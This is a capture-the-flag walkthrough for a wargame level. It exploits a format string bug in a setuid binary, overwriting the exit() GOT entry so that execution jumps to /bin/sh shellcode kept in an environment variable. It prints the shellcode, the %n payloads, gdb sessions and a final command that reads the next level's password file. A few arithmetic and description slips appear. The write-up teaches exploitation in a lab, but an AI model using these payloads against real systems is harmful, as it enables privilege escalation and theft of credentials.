# LEVEL05

## 1. Inspect The Executable

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
level05@OverRide:~$ ls -l
total 8
-rwsr-s---+ 1 level06 users 5176 Sep 10  2016 level05
```

We can see that the binary has the `s` bit set on the **execution permission**, which means the program will run with **`level06` privileges**.

```bash
level05@OverRide:~$ ./level05 
a
a
level05@OverRide:~$ ./level05 
abc
abc
level05@OverRide:~$ ./level05 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaalevel05@OverRide:~$
```

The program **reads user input** with `gets()` and **prints it** back.

## 2. Analyze The Executable

```bash
(gdb) info functions 
All defined functions:

Non-debugging symbols:
[...]
0x08048444  main
[...]
```

Using the gdb command `info functions`, we can list all functions present in the binary.
Here, we find only the function: `main`.

### Program Behavior

#### main function

The `main` function **reads user input** using `fgets()`, **converts** each **lowercase** letter to **uppercase**, then **prints** the result using `printf()`. Finally, it calls `exit()`.

## 3. Exploit Development

In this program, there is an **unsafe use** of `printf` :
```c
      printf((char *)local_78);
```
So we can perform a **Format String Attack**. And We will use this sort of structure :

```
<memory address to update>	<padding>	<%X$n>
```

Where:
  - `<memory address to update>` is the **address** of the **target variable** (`m`).
  - `<padding>` represents the **number of characters** to print.
  - `<%X$n>` **writes** the number of printed characters to the **memory address** located at position `X` on the **stack**.

The total **number of printed characters** (i.e, `<memory address to update>` + `<padding>`) determines the **value written** to the target address.

`%X$n` is a **positional format specifier** that allows writing to memory.

Structure:
- `%`  : begins the **format directive**.
- `X$` : indicates which **stack argument** (represented by `X`) is used as the **destination address**.
- `n`  : **writes** the number of characters printed so far **into that address**.

---

In this level, we will specifically perform a **GOT Overwrite Attack**.

### PLT (Procedure Linkage Table) & GOT (Global Offset Table)

In **x86 ELF binaries**, **external functions** are **dynamically linked** using the **PLT** and **GOT**.

During **compilation**, the **binary does not know** the **runtime addresses** of external functions like `exit()`, `printf()`, etc. It **cannot call them directly**.

This is where the **PLT** and **GOT** come into play:

The **PLT (Procedure Linkage Table)** is a **small stub** (a tiny piece of assembly code) that serves as an **intermediate jump** point between the **program** and the **GOT**.

Example of a **PLT stub** for `exit()`:
```bash
   0x80483d0 <exit@plt>:	jmp    *0x8049838
   0x80483d6 <exit@plt+6>:	push   $0x28
   0x80483db <exit@plt+11>:	jmp    0x8048370
```

The **GOT (Global Offset Table)** is a **table of pointers** in memory, each **entry** containing the **real address** of an **external function**. These addresses are **filled at runtime** by the **dynamic linker**.

This **process** is known as **lazy binding**.

#### Lazy Binding Process

First call to exit():
```md
call exit@plt
    ↓
PLT stub jumps to GOT[exit]
    ↓
GOT[exit] points to the dynamic linker
    ↓
Dynamic linker resolves the real address of exit()
    ↓
GOT[exit] is updated with the real address
    ↓
exit() executes
```

Subsequent calls to exit():
```md
call exit@plt
    ↓
PLT stub jumps to GOT[exit]
    ↓
GOT[exit] already contains the real address of exit()
    ↓
exit() executes directly
```

---

First, we can see there is **no `system()` call** to **redirect to**. So we are gonna use a **shellcode** :

```
\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
```

*(This one was taken form [shell-storm](https://shell-storm.org/shellcode/files/shellcode-841.html).)*

We will **store it** in the **environment** with several **NOP instruction** *(to simplify the access of the address shellcode)* :

```bash
export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" ')
```

### NOP Instruction Explanation

`NOP` stands for **No Operation**. It's an **assembly instruction** (`\x90` in x86) that **does nothing** except **advance to the next instruction**.

By placing **many `NOP` instructions** before the shellcode, if our return address points **anywhere** in the **`NOP` sled**, execution will **"slide"** through the `NOP`s **until it reaches** the **shellcode**.

This gives us a **much larger target** to hit, **increasing** the **exploit's reliability**.

---

### Get Exploit Values

#### Position in the Stack

```bash
level05@OverRide:~$ python -c 'print "aaaa" + "%x " * 12' | ./level05 
aaaa64 f7fcfac0 f7ec3add ffffd6ef ffffd6ee 0 ffffffff ffffd774 f7fdb000 61616161 25207825 78252078
```

`aaaa` corresponding to `61616161` in hexadecimal appears at the **10th position** on the stack.

---

#### GOT Address

```bash
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
   0x08048376 <+6>:	push   $0x18
   0x0804837b <+11>:	jmp    0x8048330
```

The **GOT entry address** for `exit()` is :  `0x80497e0`. In little-endian :

```
\xe0\x97\x04\x08
```

---

#### SHELLCODE Address

Then we need to **find the address** of the `SHELLCODE` **environment variable**.
We will perform the attack in a **clean environment** *(using `env -i`)* to simplify it. 

```bash
level05@OverRide:~$ env -i SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"') gdb ./level05 
[...]
(gdb) r
Starting program: /home/users/level05/level05 
^C
Program received signal SIGINT, Interrupt.
0xf7fdb440 in __kernel_vsyscall ()
(gdb) show environment
SHELLCODE=����������������������������������������������������������������������������������������������������1���
       Qh//shh/bin��̀
LINES=53
COLUMNS=107
(gdb) x/150s environ
[...]
0xffffdf58:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341\260\vQh//shh/bin\211\343\315\200"
[...]
(gdb) x 0xffffdf58
0xffffdf58:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341\260\vQh//shh/bin\211\343\315\200"
(gdb) x 0xffffdf70
0xffffdf70:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341\260\vQh//shh/bin\211\343\315\200"

```

We choose an address in the **NOP sled**, for example:  `0xffffdf70`.
In decimal : `4294958960`.

```
<memory address to update>  +   <padding>	
              4				+	4294958956      =	4294958960
```
---

### Create The Payload

Usually we can do like this :
```bash
python -c 'print "\xe0\x97\x04\x08" + "%4294958956x" + "%10$n"'
```

However, writing `4294958956` bytes would be **too large** and cause the program to crash. Instead, we **split the write into two 2-byte writes**:

- Write the **lower 2 bytes** (`0xdf70`) to `0x80497e0`
- Write the **upper 2 bytes** (`0xffff`) to `0x80497e2`

The payload structure will be :
```
[ first 2 bytes GOT ] + [ second 2 bytes GOT ] + [ lower 2 bytes - 8 ] + %10$n +  [ upper 2 bytes - (lower 2 bytes) ] + %11$n
```

For the **lower 2 bytes**, the value is :

```
0xdf70	->	0x80497e0
(-8 beause of the 2 GOT addresses written before.) 

0xdf70 - 8	->	0x80497e0
57200 - 8	->	0x80497e0
57192		->	0x80497e0
:	57192
```

For the **upper 2 bytes**, the value is :

```
0xffff	->	0x80497e2
(-57192 beause of all the characters written before.) 

0xffff - 57200	->	0x80497e2
65535 - 57200	->	0x80497e2
8335			->	0x80497e2
:	8335
```

Therefore, the payload will be :

```bash
python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57192d" + "%10$n" + "%8335d" + "%11$n"'
```

---

Heree instead of writing 1000000 literal `a` characters *(for example)* *(which would cause a broken pipe)*, we can use a **width specifier** with `%x` to generate the padding, like this: `%1000000x`.

`%x` **reads and prints** the value at the current position on the stack, then advances to the next stack argument.
When a width is specified, `printf` uses it as a **minimum field width**.

It pads the output with spaces **before** the value so that the total number of printed characters **matches** the **specified width**.

For example, if the value at the top of the stack is `0x02040608`, `%12x` will print:
```bash
    02040608
```

Representing:

```
4 (padding spaces) + 8 (printed value) = 12 characters
```

---

Using the **`env -i` command** to ensure a **clean environment**, this give the following payload :

```bash
(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57192d" + "%10$n" + "%8335d" + "%11$n"'; cat) | env -i SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
```

## 4. Capture The Flag

```bash
level05@OverRide:~$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57192d" + "%10$n" + "%8335d" + "%11$n"'; cat) | env -i SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"') ./level05 
�
[...]
100
[...]
-134415680
id
uid=1005(level05) gid=1005(level05) euid=1006(level06) egid=100(users) groups=1006(level06),100(users),1005(level05)
cat /home/users/level06/.pass

^C
```
